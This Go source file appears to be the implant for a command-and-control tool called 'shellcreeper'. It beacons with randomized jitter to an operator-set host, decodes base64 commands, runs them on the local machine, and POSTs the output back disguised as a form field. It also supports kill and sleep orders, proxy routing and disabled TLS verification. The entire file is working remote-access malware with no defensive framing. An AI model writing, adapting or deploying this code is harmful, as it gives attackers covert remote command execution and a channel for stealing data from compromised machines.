package main

import (
  "os"
  "os/exec"
  "bytes"
  "fmt"
  "net/http"
  "io/ioutil"
  "crypto/tls"
  "strings"
  "time"
  "net/url"
  "math/rand"
  "strconv"
  "encoding/base64"
)


var tot_delay = 0
var jitter = 5
var Delay = 5
var id = ""
var host = "" // ex: https://ipaddress *address of the shellcreeper server*
var proxy = "NONE" // ex: http://proxy_ip:proxy_port , set to NONE to ignore


func wait(){
    tot_delay = Delay + (rand.Intn(jitter))
    fmt.Println("Waiting for.."+strconv.Itoa(tot_delay))
    time.Sleep(time.Duration(tot_delay) * time.Second)
    check()
}
func send_results(out string){

  shellurl := host+"/en"
  var test = base64.StdEncoding.EncodeToString([]byte(out))
  data := url.Values{}
  data.Add("track", test)

  var encoded_payload = data.Encode()
  encoded_payload = encoded_payload + "|"+id


  req, err := http.NewRequest("POST", shellurl, bytes.NewBufferString(encoded_payload))
  req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

  client := &http.Client{}

  resp, err := client.Do(req)
  if err != nil {
      panic(err)
  }

  defer resp.Body.Close()

  fmt.Println("response Status:", resp.Status)
  fmt.Println("response Headers:", resp.Header)
  body, _ := ioutil.ReadAll(resp.Body)
  fmt.Println("response Body:", string(body))
}

func exec_cmd(cmd string) {
  parts := strings.Fields(cmd)
  head := parts[0]
  parts = parts[1:len(parts)]

  out, err := exec.Command(head,parts...).Output()
  if err != nil {
    fmt.Printf("%s", err)
  }

  send_results(string(out))
}

func check(){
  client := &http.Client{}
  if (proxy != "NONE"){
    fmt.Println("Theres a proxy var!")
    proxyUrl, err := url.Parse(proxy)
    if err != nil {
        fmt.Println(err)
    }

    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        Proxy: http.ProxyURL(proxyUrl),
    }
    client = &http.Client{Transport: tr}
    fmt.Println("Proxy")
  } else {
    fmt.Println("No proxy")
  }

  response, err := client.Get(host+"/en?s="+id)
  if err != nil {
      fmt.Println(err)
  }

  if err != nil {
      fmt.Printf("%s", err)
      os.Exit(1)
  } else {
      defer response.Body.Close()
      contents, err := ioutil.ReadAll(response.Body)
      if err != nil {
          fmt.Printf("%s", err)
          os.Exit(1)
      }

      if string(contents) == "Resource Not Found"{
        fmt.Printf("%s\n", "Passing...")
      } else {

        s := strings.Split(string(contents), "|")
        payload, recv_id := s[0], s[1]
        if (recv_id == id){
          // Base64 decode message
          decoded_payload, err := base64.StdEncoding.DecodeString(payload)
          if err != nil {
            panic(err)
          }
          if (string(decoded_payload) == "kill"){
            os.Exit(1)
          } else if (strings.Contains(string(decoded_payload), "sleep")){
            // If message says to sleep
            sleep_value := strings.Split(string(decoded_payload), " ")
            fmt.Println(sleep_value[1])
            Delay, err := strconv.Atoi(sleep_value[1])
            fmt.Println(Delay)
            if err != nil {
              panic(err)
            }
            fmt.Println(sleep_value[1])
          } else {
              exec_cmd(string(decoded_payload))
          }

        } else {
          fmt.Println("Message not for me, ignoring")
        }

        //fmt.Println(payload, recv_id)
      }
  }
  wait()
}

func main() {
  os.Setenv("http_proxy", "")
  os.Setenv("https_proxy", "")
  rand.Seed(time.Now().UTC().UnixNano())
  id = strconv.Itoa(rand.Intn(100000-0))
  fmt.Println(id)
  check()
}
